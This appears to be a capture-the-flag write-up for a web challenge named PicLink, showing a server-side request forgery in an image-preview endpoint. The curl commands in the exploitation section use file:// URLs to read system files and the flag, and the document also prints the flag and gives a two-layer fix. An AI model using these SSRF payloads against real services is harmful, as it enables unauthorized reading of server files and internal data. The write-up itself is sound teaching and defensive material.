# PicLink - SSRF via file:// scheme in an image proxy

| | |
|---|---|
| **Challenge** | PicLink |
| **Category** | INJ (ssrf) |
| **Points / Difficulty** | 200 / hard |
| **Target** | http://inj9.chal.deti:8048 |
| **Bug** | CWE-918 - server-side request forgery (unrestricted fetch scheme) |

## Hint
> Fetch the picture far away; the courier checks no papers, any road it will take.

## Recon
`POST /preview` (field `url`) - the app fetches the given URL and returns the
bytes as-is ("CDN link checker"). No check on the scheme or target.

## Approach
A URL's scheme need not be network: **`file://`** makes the fetch layer read the
local filesystem. Confirm on a system file, then read the flag:
```
url = file:///flag/flag
```
The app never "reads the flag" - its fetch function does, as the service user.

## Exploitation
```bash
curl -s --data-urlencode "url=file:///etc/hostname" http://inj9.chal.deti:8048/preview   # proves file://
curl -s --data-urlencode "url=file:///flag/flag"    http://inj9.chal.deti:8048/preview | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{a5c252b98d1b27e9e00981120105d9e7}
```

## For the report
- **Recon fetch that proved the scheme:** `file:///etc/hostname` returned the
  file's bytes served as an "image" → the fetcher honors non-network schemes.
- **Final request:** `url=file:///flag/flag`.
- **Fix, two layers (each stops a different attack):**
  1. **Allowlist the scheme** to `http`/`https` → kills `file://`, `gopher://`,
     etc. (local-file / protocol-smuggling reads).
  2. **Resolve the target host and deny loopback/link-local/private ranges**
     (and re-check after redirects/DNS) → kills fetches to internal services /
     cloud metadata even over http. Scheme-allowlisting alone wouldn't stop
     `http://169.254.169.254/…`; address-denylisting alone wouldn't stop
     `file://`.

## Root cause & remediation
- **Cause:** the app fetches an attacker-named URL with no scheme/target checks
  (CWE-918); its fetch layer reads the flag on the attacker's behalf.
- **Fix:** the two-layer control above; also run unprivileged and keep secrets
  off the app host / not file-readable by the service account.
